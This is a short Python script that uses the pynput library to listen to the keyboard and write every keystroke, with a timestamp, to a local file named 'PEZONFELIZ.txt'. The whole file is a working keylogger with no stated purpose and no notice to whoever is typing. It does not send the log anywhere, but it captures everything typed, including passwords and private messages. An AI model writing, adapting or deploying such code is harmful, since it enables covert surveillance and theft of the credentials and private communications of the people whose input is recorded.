from pynput.keyboard \
    import Listener
import logging 

logging.basicConfig(
    filename=("PEZONFELIZ.txt"),
    level=logging.DEBUG,
    format=" %(asctime)s-%(message)s")

def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) \
    as listener: 
    listener.join()